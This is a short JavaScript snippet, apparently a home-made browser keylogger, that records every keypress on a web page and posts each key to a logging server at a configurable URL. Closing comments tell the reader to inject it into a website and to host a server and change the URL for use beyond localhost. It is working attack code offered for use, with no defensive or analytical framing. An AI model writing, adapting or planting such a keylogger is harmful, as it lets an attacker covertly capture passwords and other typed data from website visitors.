const serverUrl = 'http://localhost:8080/log';
        function sendKeyData(keyData) {
            fetch(serverUrl, {
                method: 'POST',
                body: JSON.stringify(keyData),
                headers: {
                    'Content-Type': 'application/json'
                }
            }).catch(error => console.error('Error:', error));
        }

        document.addEventListener('keypress', function(event) {
            const keyData = {
                key: event.key,
            };
            sendKeyData(keyData);
        });

        document.addEventListener('keypress', function(event) {
            console.log(`Key pressed: ${event.key}, Code: ${event.code}`);
        });


// !!!!INJECT THIS INTO A WEBSITE!!!
// !!!!WORKS ONLY FOR LOCALHOST ON YOUR MACHINE, IF YOU WANT GLOBAL HOST YOUR WEBSITE AND CHANGE SERVERURL!!!!